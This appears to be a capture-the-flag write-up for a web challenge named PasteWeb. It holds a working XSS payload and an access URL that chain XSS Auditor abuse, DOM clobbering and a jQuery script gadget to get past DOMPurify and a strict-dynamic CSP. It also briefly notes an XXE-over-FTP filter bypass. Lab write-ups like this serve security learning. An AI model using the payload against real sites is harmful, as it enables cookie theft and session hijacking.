# PasteWeb

## Bug 1: XSS (hard)

### Payload

Create a paste with the following payload:
```
<form id="fb"><input name="ownerDocument"/><script>alert(document.cookie);</script></form>
```

Then access the paste with:
```
http://127.0.0.1/paste/b4ceb9cf-f601-44b1-bbaf-b3aa78a3206d?w=%3Cscript%20src=%22https://cdnjs.cloudflare.com/ajax/libs/dompurify/1.0.11/purify.min.js%22
```

### Idea
1. Abuse Chrome's XSS Auditor (filter-mode) to disable DOMPurify
2. Bug in paste.html js -> try catch doesn't halt execution
3. DOM Clobbering -> create element with same DOM Element ID to mess up with js queryselector
4. jQuery Script Gadget to bypass CSP Strict-Dynamic (https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf)

## Bug 2: XXE (easy)

### Payload

### Idea
XXE, use FTP to bypass HTTP(s) filters

## author
adamyi
